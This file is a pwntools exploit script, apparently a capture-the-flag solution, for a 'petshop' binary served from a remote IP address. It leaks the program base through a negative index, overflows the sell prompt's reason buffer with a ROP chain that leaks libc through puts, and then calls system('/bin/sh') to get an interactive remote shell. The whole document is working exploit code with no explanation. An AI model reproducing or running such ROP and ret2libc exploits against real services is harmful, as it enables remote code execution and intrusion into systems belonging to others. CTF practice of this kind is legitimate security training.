#!/usr/bin/python3
from pwn import *

sla = lambda delim, data: p.sendlineafter(delim, data)
sa = lambda delim, data: p.sendafter(delim, data)
s = lambda data: p.send(data)
sl = lambda data: p.sendline(data)
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()


elf = context.binary = ELF('petshop')
libc = ELF('libc-2.31.so')

def int_from_bytes(bytes):
    return int.from_bytes(bytes, byteorder='little')

def buy(type, idx_name, name):
    sla(b'-->', b'buy ' + type + b' ' + str(idx_name).encode())
    sla(b'name?', name)
def sell(idx, size, reason = None):
    sla(b'-->', b'sell ' + str(idx).encode())
    sla(b'reason', str(size).encode())
    if reason != None:
        sla(b'reason', reason)

def GDB(proc):
    gdb.attach(p, gdbscript='''
               b *(sell + 245)
               b *(sell + 367)
               b buy
               c
               ''')


#context.log_level = 'debug'
#p = process()
p = remote('103.163.24.78', 10001)
buy(b'dog', -6, b'hihih')
sla(b'-->', b'info mine')
ru(b'pets:')
ru(b'1. ')
leak = rl()[:-1]
leak = int_from_bytes(leak)
elf.address = leak - 0x4008
POP_RDI = 0x0000000000001a13 + elf.address#: pop rdi ; ret
POP_R15 = 0x0000000000001a11 + elf.address#pop rsi ; pop r15 ret



print('elf: ', hex(elf.address))
print('leak: ', hex(leak))
sell(0, 0x1000)
buy(b'dog', 1, b'\x0f'*0x3f0)
sla(b'-->', b'sell 1')

payload = flat(
    POP_RDI, 
    elf.got['puts'],
    elf.plt['puts'],
    elf.symbols['main']
)
sla(b'reason?', b'a'*0x209 + payload)
ru(b'sonable!\n')
leak = rl()[:-1]
leak = int_from_bytes(leak)
print('leak: ', hex(leak))
libc.address = leak - libc.symbols['puts']
print('libc: ', hex(libc.address))
#GDB(p)

buy(b'dog', 1, b'\x0f'*0x3f0)
sla(b'-->', b'sell 2')
payload = flat(
    POP_RDI,
    next(libc.search(b'/bin/sh')),
    POP_RDI + 1,
    libc.symbols['system']
)
sla(b'reason?', b'a'*0x209 + payload)

#sla(b'reason', b'A'*0x500)




#KCSC{0h_n0_0ur_p3t_h4s_bug?!????????????????????}
p.interactive()